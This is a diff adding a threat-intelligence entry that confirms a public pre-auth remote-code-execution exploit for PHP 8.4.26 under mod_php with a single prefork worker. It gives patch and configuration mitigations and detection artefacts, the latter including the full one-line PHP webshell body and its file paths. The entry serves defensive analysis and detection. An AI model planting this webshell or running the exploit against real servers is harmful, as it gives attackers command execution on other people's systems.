@@ -1388,3 +1388,63 @@ the x86_64 "verified 20/20" claim is **not reproducible**.
 
 Full evidence: `php2shell-intel/triage/joas-triage-2026-10-24.md`. Exploit code kept in the working
 tree only — **never** in the shareable package.
+
+## 35. ESCALATION (capability CONFIRMED) — 2026-10-24 — public pre-auth RCE reproduced with `display_errors=Off`
+
+**This supersedes the verdict in §34 and closes open watch item #2 ("reliable PUBLIC
+display_errors=Off exploit").**
+
+### 35.1 What was run
+`JoasASantos/php2shell-exploit` against **its own shipped lab**, unchanged:
+`php:8.4.26-apache`, Debian 13.7, stock `php.ini-production` (`display_errors` empty ⇒ **Off**),
+`session.upload_progress.enabled=1`, chunked multipart reachable.
+
+| Environment | Apache prefork config | Result |
+|---|---|---|
+| x86_64 (native) | default lab (`StartServers 5`, `MaxRequestWorkers 10`) | fail — leak window empty |
+| **x86_64 (native)** | **single worker** (`MaxRequestWorkers 1`) | **RCE — `uid=33(www-data)`** |
+| arm64 (qemu-emulated) | default lab | fail — leak window empty |
+| **arm64 (qemu-emulated)** | **single worker** | **RCE — `uid=33(www-data)`** |
+
+**The discriminator is the prefork worker count, not the architecture.**
+
+### 35.2 Proof that is independent of the tool's own output
+Command output redirected to a file inside the target, then read directly with `docker exec`:
+
+```
+arm64  /tmp/p2s-proof.txt → uid=33(www-data) / aarch64 / www-data
+x86_64 /tmp/x64-proof.txt → uid=33(www-data) / x86_64
+```
+
+The tool plants `/.p2s.php`, executes in-band, then deletes the webshell (`?rm` handler) — a later
+fetch returning 404 is expected, not a failure.
+
+### 35.3 Significance
+- **Confirmed public capability:** pre-auth, cookie-less, pure-HTTP RCE with **ASLR bypass and
+  `display_errors=Off`**, on a stock PHP 8.4.26 image. No application interaction, no LFI, no
+  session poisoning — this is the real bug, not the Orange Tsai-era technique.
+- **Constraint:** Apache **mod_php with a single prefork worker**. Multi-worker pools failed at the
+  memory-leak stage on both architectures in our tests; the repository's advertised "worker pinning
+  for multi-worker pools" is **unproven**.
+- Architecture is irrelevant to exploitability — x86_64 works identically.
+- This invalidates the earlier comfort position that private tooling was required for
+  `display_errors=Off`. Public tooling now covers it.
+- **Not** a universal switch: single-worker mod_php can be a low-traffic container, a
+  memory-capped deployment, or a deliberately simple pool; the majority of Apache prefork defaults
+  ship multiple workers. FPM deployments are unaffected by *this* tool (separate conditional chain).
+
+### 35.4 Mitigation — unchanged and still sufficient
+1. **Patch** PHP (8.5.12 / 8.4.27 / 8.3.36 / 8.2.35) — removes the bug outright.
+2. `session.upload_progress.enabled = 0` — breaks the exploitation path (the tool's own README lists
+   this as the mitigation).
+3. Do **not** treat worker count as a control; single-worker hardening is not a mitigation, merely
+   the condition under which this particular tool works.
+
+### 35.5 New detection artefacts (added to the package)
+- **Hardcoded webshell paths:** `/.p2s.php` (webroot), `/assets/.p2s.php`, `/tmp/.p2s.php`;
+  v2 uses `/tmp/.p2s_v2.php` and `.htaccess` with `auto_prepend_file`.
+- **105-byte webshell body:** `<?php if(isset($_GET["c"])){system($_GET["c"]);}if(isset($_GET["rm"])){unlink(__FILE__);echo"removed";}?>`
+  — high-fidelity YARA target; the `?rm` self-delete handler is unusual and distinctive.
+- Suricata: request to any URI ending `.p2s.php`; response body containing the webshell signature.
+- Hunting: access-log search for `.p2s.php`, `.p2s_v2.php`, `.htaccess` writes, and `?c=` execution
+  patterns on those paths.
